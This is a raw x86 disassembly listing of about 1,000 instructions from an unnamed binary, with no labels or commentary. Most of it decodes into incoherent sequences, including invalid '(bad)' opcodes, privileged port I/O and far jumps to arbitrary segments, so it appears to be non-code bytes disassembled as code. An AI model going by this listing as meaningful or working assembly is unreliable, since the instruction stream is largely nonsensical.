  405a0c:	stos   BYTE PTR es:[edi],al
  405a0d:	test   eax,0x830815e9
  405a12:	dec    ebp
  405a13:	mov    BYTE PTR [edi-0x2f3723a7],bl
  405a19:	clc    
  405a1a:	in     eax,0xe9
  405a1c:	dec    esp
  405a1d:	ds add eax,0x5a5ec1f2
  405a23:	ins    BYTE PTR es:[edi],dx
  405a24:	out    0x5,al
  405a26:	jge    0x405aa5
  405a28:	sbb    eax,0xb7db2ce3
  405a2d:	push   0xcd7374ca
  405a32:	mov    bh,0x6e
  405a34:	mov    WORD PTR [eax+0x5888d29b],fs
  405a3a:	inc    eax
  405a3b:	mov    esp,0x6f027ac4
  405a40:	ds xchg edi,eax
  405a42:	fcomip st,st(1)
  405a44:	push   esp
  405a45:	les    edi,FWORD PTR [edi+ebx*8-0x50f107c5]
  405a4c:	xchg   BYTE PTR [edi+0x1e98a55d],ah
  405a52:	xchg   ecx,eax
  405a53:	aam    0x6c
  405a55:	push   cs
  405a56:	jmp    FWORD PTR [ecx+0x5]
  405a59:	push   cs
  405a5a:	pusha  
  405a5b:	pop    ss
  405a5c:	lock xchg esp,eax
  405a5e:	scas   al,BYTE PTR es:[edi]
  405a5f:	mov    WORD PTR [ecx+0x6080a299],ss
  405a65:	sbb    edx,DWORD PTR [esi]
  405a67:	mov    edi,0xb1e61705
  405a6c:	mov    ebx,0x5af12285
  405a71:	pushf  
  405a72:	or     ecx,edx
  405a74:	or     eax,0x2beafbbe
  405a79:	sbb    al,0xb4
  405a7b:	dec    ebx
  405a7c:	adc    al,cl
  405a7e:	dec    ebx
  405a7f:	loop   0x405a52
  405a81:	inc    esi
  405a82:	push   ebx
  405a83:	push   edi
  405a84:	pop    ebx
  405a85:	ds sbb eax,0xa8b8b978
  405a8b:	ins    BYTE PTR es:[edi],dx
  405a8c:	leave  
  405a8d:	push   esp
  405a8e:	or     al,0xee
  405a90:	scas   al,BYTE PTR es:[edi]
  405a91:	aam    0x25
  405a93:	shr    eax,0x9e
  405a96:	das    
  405a97:	adc    BYTE PTR [eax],0x68
  405a9a:	clc    
  405a9b:	cs push ds
  405a9d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405a9e:	call   0xa687673d
  405aa3:	jge    0x405aca
  405aa5:	jb     0x405b1f
  405aa7:	jmp    ecx
  405aa9:	ins    BYTE PTR es:[edi],dx
  405aaa:	lods   al,BYTE PTR ds:[esi]
  405aab:	out    0xd8,al
  405aad:	push   esp
  405aae:	pop    ecx
  405aaf:	mov    dl,0x31
  405ab1:	into   
  405ab2:	jb     0x405b1b
  405ab4:	mov    esp,0x3f38fa40
  405ab9:	ret    
  405aba:	scas   al,BYTE PTR es:[edi]
  405abb:	xchg   esp,eax
  405abc:	inc    edx
  405abd:	or     DWORD PTR [esp+eax*1],ecx
  405ac0:	ss sti 
  405ac2:	cmp    BYTE PTR [ecx],ch
  405ac4:	js     0x405afd
  405ac6:	mov    ds:0x2ed58de6,eax
  405acb:	rcl    cl,1
  405acd:	mov    dh,0x7f
  405acf:	adc    ebx,esi
  405ad1:	sub    al,0x24
  405ad3:	mov    dl,0xba
  405ad5:	dec    ebp
  405ad6:	cdq    
  405ad7:	add    BYTE PTR [ecx+0x1250a562],ah
  405add:	ficom  DWORD PTR ds:0xf1cfa2f4
  405ae3:	ret    
  405ae4:	sbb    edi,DWORD PTR [edx+0x18c54fc3]
  405aea:	mov    ?,WORD PTR [esi]
  405aec:	pop    ebx
  405aed:	scas   al,BYTE PTR es:[edi]
  405aee:	ret    
  405aef:	mov    ah,0x63
  405af1:	idiv   BYTE PTR [edx]
  405af3:	mov    WORD PTR [eax-0x34bda1c7],?
  405af9:	dec    ebx
  405afa:	push   edi
  405afb:	fisubr WORD PTR [esi]
  405afd:	dec    edx
  405afe:	sbb    esp,DWORD PTR [ebx]
  405b00:	adc    al,0x6c
  405b02:	jmp    0xd29d0cbc
  405b07:	dec    edx
  405b08:	ins    BYTE PTR es:[edi],dx
  405b09:	add    DWORD PTR [ecx-0x2915bf50],edi
  405b0f:	xor    DWORD PTR [ebp-0x19],ebp
  405b12:	enter  0xfbf,0x59
  405b16:	cld    
  405b17:	ins    BYTE PTR es:[edi],dx
  405b18:	mov    BYTE PTR [ecx-0x38303222],al
  405b1e:	sbb    ah,BYTE PTR [esi+0x2251e37]
  405b24:	mov    al,ds:0x93adb2d
  405b29:	push   edx
  405b2a:	push   ebp
  405b2b:	inc    ebp
  405b2c:	sbb    al,0x66
  405b2e:	pop    edx
  405b2f:	mov    ch,0x85
  405b31:	fist   DWORD PTR [edx-0x62]
  405b34:	adc    eax,0x5bc6acaa
  405b39:	shr    DWORD PTR [edx+0x23a28d53],0x4f
  405b40:	xor    bh,dl
  405b42:	repz jecxz 0x405b33
  405b45:	jae    0x405ad1
  405b47:	fwait
  405b48:	pop    es
  405b49:	sbb    esp,DWORD PTR [ecx]
  405b4b:	xor    WORD PTR [ecx+0xbaea9e5],dx
  405b52:	push   0x2cb5d240
  405b57:	or     eax,0x6cd030bb
  405b5c:	je     0x405b6b
  405b5e:	xor    dl,BYTE PTR [edi+0x1264964e]
  405b64:	sub    al,0xed
  405b66:	push   ebp
  405b67:	mov    eax,ds:0x6f21e02c
  405b6c:	sti    
  405b6d:	scas   eax,DWORD PTR es:[edi]
  405b6e:	aad    0x95
  405b70:	add    BYTE PTR [ecx-0x663909bf],0x55
  405b77:	push   edx
  405b78:	dec    ebx
  405b79:	mov    ecx,0xe4d6facd
  405b7e:	jne    0x405b9b
  405b80:	popa   
  405b81:	lea    ebp,[edi+esi*4-0x1d]
  405b85:	shl    DWORD PTR [ebp-0x3e8854b8],0x3d
  405b8c:	cmc    
  405b8d:	test   al,0x62
  405b8f:	scas   eax,DWORD PTR es:[edi]
  405b90:	pop    ebp
  405b91:	in     al,0x2d
  405b93:	mov    ah,0x8
  405b95:	scas   al,BYTE PTR es:[edi]
  405b96:	dec    ecx
  405b97:	call   0xa0f7:0x8041c78a
  405b9e:	xchg   edi,eax
  405b9f:	out    0xf3,eax
  405ba1:	add    BYTE PTR [edi+0x42],bh
  405ba4:	enter  0xc6fd,0xaf
  405ba8:	call   0x6db8:0x3c5bfa01
  405baf:	sub    edi,esp
  405bb1:	push   ds
  405bb2:	add    eax,0x356d848e
  405bb7:	mov    ds:0x3a1bbf16,eax
  405bbc:	hlt    
  405bbd:	dec    ecx
  405bbe:	mov    edx,DWORD PTR [edx+0x16]
  405bc1:	test   BYTE PTR [eax-0x3f9e6766],dl
  405bc7:	or     eax,0xde11de9b
  405bcc:	push   0xffffffea
  405bce:	retf   
  405bcf:	in     al,0xe4
  405bd1:	inc    ecx
  405bd2:	sub    DWORD PTR [ebx],edi
  405bd4:	dec    edx
  405bd5:	xor    al,0x6
  405bd7:	cmp    bl,al
  405bd9:	xchg   esi,eax
  405bda:	push   ebx
  405bdb:	loopne 0x405c1b
  405bdd:	out    dx,al
  405bde:	fnsave [edi-0x9175b59]
  405be4:	xor    DWORD PTR [esi],ebx
  405be6:	push   eax
  405be7:	pop    esi
  405be8:	xchg   ecx,eax
  405be9:	(bad)  
  405bea:	push   cs
  405beb:	call   0xe3469388
  405bf0:	in     al,dx
  405bf1:	xlat   BYTE PTR ds:[ebx]
  405bf2:	mov    al,0xcc
  405bf4:	sbb    al,0xa5
  405bf6:	frstor [esi+0x36]
  405bf9:	frstor [eax]
  405bfb:	jle    0x405b9b
  405bfd:	dec    eax
  405bfe:	(bad)  
  405bff:	push   ebx
  405c00:	jl     0x405b83
  405c02:	hlt    
  405c03:	push   edx
  405c04:	js     0x405c1a
  405c06:	ds jmp 0x2030:0x7cb1bee0
  405c0e:	jnp    0x405bd4
  405c10:	cmp    al,0xc1
  405c12:	cmp    ch,BYTE PTR ds:0x88c99d2e
  405c18:	in     al,dx
  405c19:	fisttp WORD PTR [ebp+0x3c026f6a]
  405c1f:	dec    edx
  405c20:	or     bl,bh
  405c22:	inc    edi
  405c23:	push   0xffffffe0
  405c25:	pop    es
  405c26:	jmp    0x405bb0
  405c28:	jl     0x405bdd
  405c2a:	lods   al,BYTE PTR ds:[esi]
  405c2b:	out    dx,al
  405c2c:	scas   al,BYTE PTR es:[edi]
  405c2d:	mov    bl,0x7a
  405c2f:	jns    0x405c53
  405c31:	(bad)  
  405c32:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405c33:	mov    DWORD PTR [ecx-0xe3fa5a4],ecx
  405c39:	push   edx
  405c3a:	mov    edi,0xec021f3
  405c3f:	push   eax
  405c40:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405c41:	sbb    al,0x83
  405c43:	imul   edx,eax,0xffffffb1
  405c46:	sbb    al,0x41
  405c48:	jle    0x405bec
  405c4a:	bound  esi,QWORD PTR [ecx-0x7676fc3e]
  405c50:	dec    ebp
  405c51:	jle    0x405cac
  405c53:	mov    BYTE PTR [ebp+0x5e710557],dl
  405c59:	(bad)  
  405c5a:	mov    DWORD PTR [ebp+0x40d8a3ff],edi
  405c60:	loope  0x405bf0
  405c62:	adc    ch,BYTE PTR [eax]
  405c64:	outs   dx,BYTE PTR ds:[esi]
  405c65:	sub    ebp,edi
  405c67:	imul   esi,DWORD PTR ss:[ebx],0xea36044
  405c6e:	ss mov cl,0xe0
  405c71:	pop    ss
  405c72:	fild   WORD PTR [ebx-0x27]
  405c75:	and    esi,DWORD PTR [esp+edi*1]
  405c78:	cmp    DWORD PTR [ebx+0x3dcb8c9],edi
  405c7e:	mov    DWORD PTR [esi],esi
  405c80:	ret    
  405c81:	adc    al,0xf
  405c83:	leave  
  405c84:	mov    edi,0x16ae9f40
  405c89:	and    eax,0x3b70ea37
  405c8e:	jecxz  0x405c85
  405c90:	sub    dl,BYTE PTR [eax+edx*2]
  405c93:	mov    al,ds:0x13b30c20
  405c98:	call   0x853d1cf5
  405c9d:	inc    edi
  405c9e:	mov    ds:0xef7335a1,eax
  405ca3:	call   0x7d7e2ee7
  405ca8:	cld    
  405ca9:	push   edx
  405caa:	push   0x48ebe462
  405caf:	or     ecx,DWORD PTR [ebx]
  405cb1:	pop    ds
  405cb2:	icebp  
  405cb3:	pop    edx
  405cb4:	inc    esp
  405cb5:	adc    bl,ah
  405cb7:	inc    ecx
  405cb8:	jmp    0x405cbf
  405cba:	(bad)
  405cbe:	xor    BYTE PTR [ecx-0x76],ch
  405cc1:	les    di,DWORD PTR fs:[edx+edi*4-0x12a3746f]
  405cca:	(bad)  
  405ccb:	fwait
  405ccc:	sub    eax,0x65877b78
  405cd1:	lods   al,BYTE PTR ds:[esi]
  405cd2:	enter  0xda93,0xac
  405cd6:	fild   WORD PTR [esi]
  405cd8:	mov    ds:0x1c1454,eax
  405cdd:	cmp    ah,dh
  405cdf:	inc    ebx
  405ce0:	add    BYTE PTR [edi-0x421c1eb9],dl
  405ce6:	pusha  
  405ce7:	xchg   esi,eax
  405ce8:	popf   
  405ce9:	add    eax,0x2f960397
  405cee:	pop    eax
  405cef:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405cf0:	(bad)  
  405cf1:	addr16 pop esp
  405cf3:	jb     0x405cf4
  405cf5:	out    dx,eax
  405cf6:	enter  0x7efe,0x8b
  405cfa:	push   ebp
  405cfb:	int3   
  405cfc:	jmp    0x4063dc
  405d01:	mov    edx,DWORD PTR [ebp-0x3c]
  405d04:	mov    edi,DWORD PTR [ebp-0x4]
  405d07:	xor    edx,eax
  405d09:	xor    edi,eax
  405d0b:	add    edx,ecx
  405d0d:	add    edi,ecx
  405d0f:	imul   edx,edi
  405d12:	mov    edi,DWORD PTR [ebp-0x8]
  405d15:	mov    ebx,DWORD PTR [ebp-0x10]
  405d18:	sub    ebx,edi
  405d1a:	jmp    0x406074
  405d1f:	jmp    0xd15f6e3f
  405d24:	xor    eax,0xe321e9f1
  405d29:	les    ecx,FWORD PTR [edi]
  405d2b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405d2c:	mov    dh,BYTE PTR [ebx]
  405d2e:	popf   
  405d2f:	das    
  405d30:	ds jle 0x405db1
  405d33:	xor    edi,DWORD PTR [ebp+0x7e]
  405d36:	jle    0x405d05
  405d38:	and    ch,cl
  405d3a:	pop    ss
  405d3b:	test   al,0x37
  405d3d:	jns    0x405cfd
  405d3f:	es pop edx
  405d41:	clc    
  405d42:	mov    al,0xac
  405d44:	sub    eax,0xfb071157
  405d49:	loopne 0x405db7
  405d4b:	add    BYTE PTR [esi],cl
  405d4d:	fst    DWORD PTR [ecx-0x249d9ce1]
  405d53:	push   es
  405d54:	(bad)  
  405d56:	loope  0x405d54
  405d58:	push   0x63ac0b6f
  405d5d:	push   ebx
  405d5e:	cs cwde 
  405d60:	xor    BYTE PTR [ecx+0x35],dl
  405d63:	mov    DWORD PTR [esi-0x20],ebx
  405d66:	dec    ecx
  405d67:	rol    BYTE PTR [edi-0x33],1
  405d6a:	stos   DWORD PTR es:[edi],eax
  405d6b:	aaa    
  405d6c:	or     eax,0x22b50730
  405d71:	xor    ebp,ecx
  405d73:	imul   edi,DWORD PTR [ebx],0xffffffa1
  405d76:	rcr    BYTE PTR [edi+0x6b1d2217],1
  405d7c:	xchg   bh,cl
  405d7e:	push   0xfffffffb
  405d80:	or     DWORD PTR ds:0xb12d05e0,0xa13935b5
  405d8a:	daa    
  405d8b:	sub    edi,DWORD PTR [eax]
  405d8d:	jns    0x405d59
  405d8f:	dec    ebp
  405d90:	enter  0x81a9,0xf8
  405d94:	shl    BYTE PTR [esi],cl
  405d96:	add    ah,BYTE PTR [ecx-0xb655150]
  405d9c:	or     BYTE PTR [edx-0x4d],al
  405d9f:	push   esp
  405da0:	retf   0xce99
  405da3:	mov    al,ds:0x22a77dea
  405da8:	rcl    BYTE PTR [ebx+0x6],1
  405dab:	cmp    ah,dl
  405dad:	cmovno ebp,esi
  405db0:	pop    esp
  405db1:	push   edi
  405db2:	pop    esp
  405db3:	out    dx,eax
  405db4:	(bad)  
  405db5:	jmp    0xcff6:0xef1a3dd3
  405dbc:	gs out dx,al
  405dbe:	cdq    
  405dbf:	dec    ebx
  405dc0:	cdq    
  405dc1:	call   0x8fbcadf6
  405dc6:	mov    BYTE PTR [eax],dh
  405dc8:	push   0xffffffc3
  405dca:	arpl   WORD PTR [ecx+0x4912f9f4],cx
  405dd0:	add    DWORD PTR [eax-0x68],0x23
  405dd4:	push   ecx
  405dd5:	fidivr DWORD PTR [esi]
  405dd7:	xor    eax,0x6869a388
  405ddc:	push   esi
  405ddd:	sbb    al,0x79
  405ddf:	fnsave [ebp-0x636baebd]
  405de5:	retf   
  405de6:	(bad)  
  405de7:	adc    dl,cl
  405de9:	ja     0x405dc3
  405deb:	jo     0x405df3
  405ded:	mov    ch,0x8f
  405def:	mov    al,ds:0x4702fcfe
  405df4:	or     eax,0x9feb9687
  405df9:	xchg   eax,eax
  405dfb:	fimul  DWORD PTR [edx+0x78]
  405dfe:	pushf  
  405dff:	mov    ds:0xdbdae158,al
  405e04:	and    DWORD PTR [esi+esi*4+0x574e4e46],edx
  405e0b:	jmp    0x7362:0x78501fc7
  405e12:	clc    
  405e13:	repnz pusha 
  405e15:	adc    eax,0xfd7b2ce2
  405e1a:	push   ss
  405e1b:	mov    al,ds:0xb5653a47
  405e20:	std    
  405e21:	mov    ?,WORD PTR [eax+0x28]
  405e24:	mov    gs,WORD PTR [ebp+0x2c]
  405e27:	xor    esp,ebx
  405e29:	pop    edx
  405e2a:	in     eax,0x18
  405e2c:	xchg   BYTE PTR [eax-0x1f04c2b5],dl
  405e32:	mov    ds:0xd201ae2f,eax
  405e37:	add    DWORD PTR [ecx+edi*8-0x7a],esp
  405e3b:	ds jb  0x405dd9
  405e3e:	adc    edx,edi
  405e40:	jp     0x405e51
  405e42:	xchg   ecx,eax
  405e43:	push   ss
  405e44:	es mov esi,0xa7fd3182
  405e4a:	imul   ebx,DWORD PTR [ebx+0x4f97d872],0x58
  405e51:	stos   BYTE PTR es:[edi],al
  405e52:	sbb    eax,0xdcac5a7c
  405e57:	mov    WORD PTR [ebx-0x75],fs
  405e5a:	and    BYTE PTR [esi-0x717cf053],ah
  405e60:	retf   0x357d
  405e63:	push   esi
  405e64:	(bad)  
  405e67:	and    esp,DWORD PTR [ebx]
  405e69:	mov    al,ds:0xb725c346
  405e6e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405e6f:	out    dx,eax
  405e70:	mov    esi,0xbbd0b2e5
  405e75:	fstp   QWORD PTR [esi]
  405e77:	pop    ss
  405e78:	test   BYTE PTR [ebp+0x24c69262],0x29
  405e7f:	icebp  
  405e80:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405e81:	jns    0x405e65
  405e83:	sbb    ecx,DWORD PTR [edx+0x8]
  405e86:	cwde   
  405e87:	xchg   esp,eax
  405e88:	dec    ebp
  405e89:	jns    0x405ebf
  405e8b:	sti    
  405e8c:	and    BYTE PTR [edx+eiz*2],cl
  405e8f:	xor    BYTE PTR [eax+edx*2],dh
  405e92:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405e93:	jns    0x405e6b
  405e95:	sub    DWORD PTR [ecx+0x2505d92a],ebp
  405e9b:	push   ebp
  405e9c:	dec    ecx
  405e9d:	pop    ebp
  405e9e:	test   DWORD PTR [eax-0x3d8340d2],edi
  405ea4:	mov    eax,ds:0xdf8a66f1
  405ea9:	loope  0x405e3c
  405eab:	jge    0x405ec6
  405ead:	mov    ch,0x3b
  405eaf:	fistp  QWORD PTR [ecx-0x1c]
  405eb2:	sar    DWORD PTR [edx+0x65],1
  405eb5:	mov    bl,0xa3
  405eb7:	adc    ch,BYTE PTR ds:0xd63af1e5
  405ebd:	ds je  0x405e61
  405ec0:	jmp    0x77e677c7
  405ec5:	dec    BYTE PTR [eax]
  405ec7:	cli    
  405ec8:	in     al,dx
  405ec9:	dec    edx
  405eca:	dec    edx
  405ecb:	xor    eax,0x15d63de0
  405ed0:	shr    DWORD PTR [eax+0x13],cl
  405ed3:	sbb    ebp,ecx
  405ed5:	pop    edx
  405ed6:	int    0xb0
  405ed8:	sbb    al,0xab
  405eda:	into   
  405edb:	call   0xbd0aa7bc
  405ee0:	push   esi
  405ee1:	inc    edi
  405ee2:	adc    eax,0xe35ee80c
  405ee7:	xchg   ebp,eax
  405ee8:	mov    bl,0x69
  405eea:	pop    ebp
  405eeb:	push   eax
  405eec:	ds sti 
  405eee:	mov    DWORD PTR [esi],edi
  405ef0:	jl     0x405eec
  405ef2:	mov    BYTE PTR [ebp+ebp*8-0x5b],ch
  405ef6:	push   ecx
  405ef7:	rcr    DWORD PTR [eax+0x1cd5ebe],cl
  405efd:	mov    cl,0x43
  405eff:	mov    ch,0xc2
  405f01:	aam    0xf5
  405f03:	mov    DWORD PTR [edi+esi*4+0x45],eax
  405f07:	out    dx,eax
  405f08:	and    BYTE PTR [ecx-0x3f],ah
  405f0b:	retf   
  405f0c:	fild   QWORD PTR [eax]
  405f0e:	fucomip st,st(7)
  405f10:	push   0x47
  405f12:	jnp    0x405f58
  405f14:	(bad)  
  405f15:	call   0x63ae:0xb52d6578
  405f1c:	loopne 0x405f33
  405f1e:	test   bl,0x3a
  405f21:	retf   0xbb75
  405f24:	sbb    BYTE PTR [ebx+0x46ddb52e],0xfa
  405f2b:	sahf   
  405f2c:	xchg   ecx,eax
  405f2d:	push   ss
  405f2e:	xchg   esi,eax
  405f2f:	adc    al,0x10
  405f31:	jg     0x405f72
  405f33:	test   esp,edi
  405f35:	push   es
  405f36:	pop    eax
  405f37:	dec    ebx
  405f38:	ret    
  405f39:	add    al,0x61
  405f3b:	dec    esp
  405f3c:	sub    esp,ecx
  405f3e:	jg     0x405f2d
  405f40:	test   BYTE PTR [esi+0x737b545b],cl
  405f46:	ret    0x9136
  405f49:	adc    eax,0xdad1ffe3
  405f4e:	lock mov ds:0x5ee2214a,al
  405f54:	mov    bl,0x27
  405f56:	jmp    0x6d74:0xc5fa495f
  405f5d:	aam    0x68
  405f5f:	fsubr  st(1),st
  405f61:	sub    cl,BYTE PTR [esi+0x214984aa]
  405f67:	add    DWORD PTR [esi+0x57],eax
  405f6a:	sub    DWORD PTR [ebx],esi
  405f6c:	setae  BYTE PTR [edi]
  405f6f:	fimul  WORD PTR [eax+0x76]
  405f72:	mov    ds:0x90f7fabd,al
  405f77:	enter  0xb7b9,0x79
  405f7b:	dec    edx
  405f7c:	dec    esp
  405f7d:	and    DWORD PTR [ebx-0x5e],0x60
  405f81:	ins    DWORD PTR es:[edi],dx
  405f82:	xor    BYTE PTR [ebx+0x79],ch
  405f85:	dec    ebx
  405f86:	adc    eax,0x9435e1c7
  405f8b:	fprem1 
  405f8d:	xchg   ecx,eax
  405f8e:	leave  
  405f8f:	test   edx,0x16c8d5f2
  405f95:	push   ds
  405f96:	ffreep st(4)
  405f98:	xchg   edi,eax
  405f99:	adc    bh,dh
  405f9b:	fimul  WORD PTR [edi+ebx*4+0xa6c25c2]
  405fa2:	test   BYTE PTR [edx+0x28],bl
  405fa5:	cmc    
  405fa6:	push   edi
  405fa7:	call   0x1d4c1c05
  405fac:	xor    ah,al
  405fae:	xchg   DWORD PTR [esi+edi*4],ebx
  405fb1:	je     0x405fc6
  405fb3:	test   esi,esi
  405fb5:	push   ds
  405fb6:	(bad)  
  405fb7:	mov    ds:0xadd1a985,al
  405fbc:	jae    0x405f7b
  405fbe:	sub    cl,bh
  405fc0:	mov    cl,dl
  405fc2:	and    al,0xa0
  405fc4:	jge    0x405fa1
  405fc6:	scas   eax,DWORD PTR es:[edi]
  405fc7:	mov    bh,0xc4
  405fc9:	loope  0x405f6a
  405fcb:	inc    edx
  405fcc:	out    dx,eax
  405fcd:	mov    esi,0x2914828d
  405fd2:	jecxz  0x40603b
  405fd4:	gs scas eax,DWORD PTR es:[edi]
  405fd6:	push   0xd19e0a07
  405fdb:	xchg   ch,ch
  405fdd:	jg     0x405fc9
  405fdf:	(bad)  
  405fe1:	add    esp,esp
  405fe3:	dec    edi
  405fe4:	mov    bh,0x17
  405fe6:	sub    ebp,DWORD PTR [esi]
  405fe8:	ret    0x8b10
  405feb:	sbb    BYTE PTR [eax],bl
  405fed:	push   ecx
  405fee:	ror    BYTE PTR [ebx+0x4c],0x51
  405ff2:	cmp    ecx,DWORD PTR [esi+0x29516071]
  405ff8:	cmp    eax,0x72d33451
  405ffd:	loope  0x406051
  405fff:	or     ebx,DWORD PTR [ecx]
  406001:	mov    ebx,0x5f98b8cd
  406006:	push   0x28
  406008:	(bad)  
  406009:	outs   dx,BYTE PTR ds:[esi]
  40600a:	aam    0x34
  40600c:	aaa    
  40600d:	mov    ebp,0xb971cb87
  406012:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406013:	dec    esi
  406014:	and    al,BYTE PTR [ecx-0x21]
  406017:	retf   
  406018:	cmp    ebx,DWORD PTR [esi-0x1d]
  40601b:	mov    esi,0x6983ca6f
  406020:	call   0xbe34:0xe69eca86
  406027:	push   edx
  406028:	dec    eax
  406029:	mov    ebx,0xbf335474
  40602e:	adc    al,0xee
  406030:	push   eax
  406031:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406032:	jmp    0x20d3bbd0
  406037:	imul   ebp,eax,0x49
  40603a:	cmp    bl,dh
  40603c:	in     al,0xe0
  40603e:	add    eax,esp
  406040:	mov    bh,0x9f
  406042:	repz and esi,esi
  406045:	loop   0x406054
  406047:	pop    ss
  406048:	shl    esp,1
  40604a:	gs into 
  40604c:	out    0x1f,eax
  40604e:	imul   edx,DWORD PTR [ebp-0x27315c3c],0x579ce2c4
  406058:	push   es
  406059:	in     eax,0x26
  40605b:	test   BYTE PTR [ecx-0x72160860],bl
  406061:	jmp    0x405fe5
  406063:	pop    es
  406064:	adc    edi,DWORD PTR [ebx]
  406066:	adc    eax,0x985d99d6
  40606b:	xor    BYTE PTR [eax+edx*8-0x3],al
  40606f:	fld    QWORD PTR [esi]
  406071:	sbb    edx,DWORD PTR [esi+0x72]
  406074:	cmp    ebx,edx
  406076:	mov    edx,DWORD PTR [ebp-0x38]
  406079:	jmp    0x4063d3
  40607e:	test   eax,0x68f06eef
  406083:	jno    0x406036
  406085:	ja     0x406061
  406087:	shr    BYTE PTR [edx+0x79],0xd
  40608b:	lock xor BYTE PTR [ebp+0x7e7e3de0],0x33
  406093:	jge    0x406113
  406095:	jle    0x4060a1
  406097:	sbb    eax,esp
  406099:	stos   BYTE PTR es:[edi],al
  40609a:	cmp    al,0x70
  40609c:	xor    bh,cl
  40609e:	cli    
  40609f:	add    BYTE PTR [eax],ah
  4060a1:	cmp    BYTE PTR [edi+0x9],0xdc
  4060a5:	mov    dl,dh
  4060a7:	sti    
  4060a8:	push   0x9df2ea7d
  4060ad:	ret    0x2ca1
  4060b0:	pop    ebx
  4060b1:	sub    DWORD PTR [eax-0x80],ebp
  4060b4:	mov    ecx,0xd0d8eb74
  4060b9:	xlat   BYTE PTR ds:[ebx]
  4060ba:	lock loopne 0x406136
  4060bd:	mov    ah,0x4e
  4060bf:	repz jecxz 0x406126
  4060c2:	add    BYTE PTR [ebp-0x54037b5f],ch
  4060c8:	and    eax,0x70
  4060cb:	icebp  
  4060cc:	mov    ebx,0xd4f0b08f
  4060d1:	retf   0x2d23
  4060d4:	dec    edi
  4060d5:	(bad)  
  4060d6:	lahf   
  4060d7:	stos   BYTE PTR es:[edi],al
  4060d8:	sbb    bl,BYTE PTR [edi-0x6a]
  4060db:	add    ch,BYTE PTR [eax]
  4060dd:	mov    ah,0x8d
  4060df:	out    0xb2,al
  4060e1:	jbe    0x40607b
  4060e3:	outs   dx,DWORD PTR ds:[esi]
  4060e4:	rol    DWORD PTR [esp+0x47],1
  4060e8:	mov    ds:0x8f5e2,al
  4060ed:	test   BYTE PTR [ebp+0x4ad53b0b],ah
  4060f3:	sbb    ecx,DWORD PTR [ebx+esi*8]
  4060f6:	or     esi,DWORD PTR [ecx+0x674732a9]
  4060fc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4060fd:	int    0xae
  4060ff:	mov    ah,0xf5
  406101:	adc    al,BYTE PTR [ebp-0x53]
  406104:	cld    
  406105:	test   DWORD PTR [ebp+0x7f],edi
  406108:	mov    dl,0xd8
  40610a:	jge    0x40614f
  40610c:	cli    
  40610d:	xor    bh,bh
  40610f:	movq   QWORD PTR ds:0x21bbbdaa,mm4
  406116:	xchg   ecx,eax
  406117:	(bad)  
  406119:	fdivr  st,st(0)
  40611b:	push   ebx
  40611c:	xchg   BYTE PTR [eax+0x47],dl
  40611f:	and    BYTE PTR [eax],0x53
  406122:	jno    0x40613a
  406124:	dec    edx
  406125:	mov    DWORD PTR [ecx],edx
  406127:	mov    ds:0x3e017f1a,eax
  40612c:	push   ecx
  40612d:	sub    BYTE PTR [eax+0x3896ed4a],dl
  406133:	jo     0x4060c9
  406135:	leave  
  406136:	push   ebp
  406137:	push   edi
  406138:	fisttp DWORD PTR [ebx+0x31]
  40613b:	jae    0x4061a0
  40613d:	or     eax,0x19b355a0
  406142:	mov    BYTE PTR [esi+0x358ec9e],al
  406148:	mov    bl,0x7e
  40614a:	jns    0x406162
  40614c:	ds cwde 
  40614e:	jae    0x4061a0
  406150:	arpl   WORD PTR [ebx-0x45],si
  406153:	xor    al,BYTE PTR [ebp+0x1a]
  406156:	call   0x3b8f:0xa4d8eae3
  40615d:	and    DWORD PTR [ebx+0x42],esi
  406160:	dec    edx
  406161:	gs pop esi
  406163:	daa    
  406164:	sbb    edx,esp
  406166:	xchg   ebp,eax
  406167:	adc    BYTE PTR [edi+edi*4+0x5b058b97],0x6b
  40616f:	loop   0x40611f
  406171:	idiv   BYTE PTR [ebp-0x29]
  406174:	jmp    DWORD PTR [edi+0x54bb9dde]
  40617a:	xor    al,0x4b
  40617c:	retf   0x8e44
  40617f:	inc    edx
  406180:	push   cs
  406181:	adc    cl,BYTE PTR [ecx-0x38749a31]
  406187:	add    BYTE PTR [esi+0x3121cabb],bh
  40618d:	retf   
  40618e:	jl     0x4061aa
  406190:	mov    BYTE PTR [edx+eax*2+0x7df4db24],ch
  406197:	xor    ecx,DWORD PTR [edx-0x21bfdf64]
  40619d:	addr16 mov al,ds:0xda14
  4061a1:	ret    0xb3ef
  4061a4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4061a5:	pop    esi
  4061a6:	fisubr DWORD PTR [esp+ebx*4+0x38]
  4061aa:	add    eax,0xde25be77
  4061af:	in     al,dx
  4061b0:	add    ah,al
  4061b2:	(bad)  
  4061b4:	dec    esi
  4061b5:	enter  0x3f7d,0x19
  4061b9:	pop    ds
  4061ba:	dec    ecx
  4061bb:	add    BYTE PTR [esi-0x17],ch
  4061be:	enter  0x16be,0x33
  4061c2:	jle    0x40623b
  4061c4:	enter  0x5c04,0x11
  4061c8:	test   eax,0x9d58a72b
  4061cd:	(bad)  
  4061ce:	sub    al,BYTE PTR [edx-0x1cfb0762]
  4061d4:	adc    ch,al
  4061d6:	or     cx,WORD PTR ds:0x53f4a0d6
  4061dd:	xor    eax,0x50a2afa9
  4061e2:	test   BYTE PTR [ebx-0x76],bl
  4061e5:	mov    ds:0xb607cb53,eax
  4061ea:	jo     0x4061d3
  4061ec:	adc    al,0x23
  4061ee:	popa   
  4061ef:	sub    al,0xa5
  4061f1:	repnz (bad) 
  4061f4:	dec    esp
  4061f5:	inc    ebx
  4061f6:	sbb    BYTE PTR [eax+0x16],al
  4061f9:	call   0x91a0:0xfc04675c
  406200:	xchg   ebx,eax
  406201:	fld    TBYTE PTR [esi+0x2b4f1061]
  406207:	or     DWORD PTR ds:0x15ff71f3,0x60ed02ad
  406211:	inc    esi
  406212:	add    ebx,DWORD PTR [eax+0x5a]
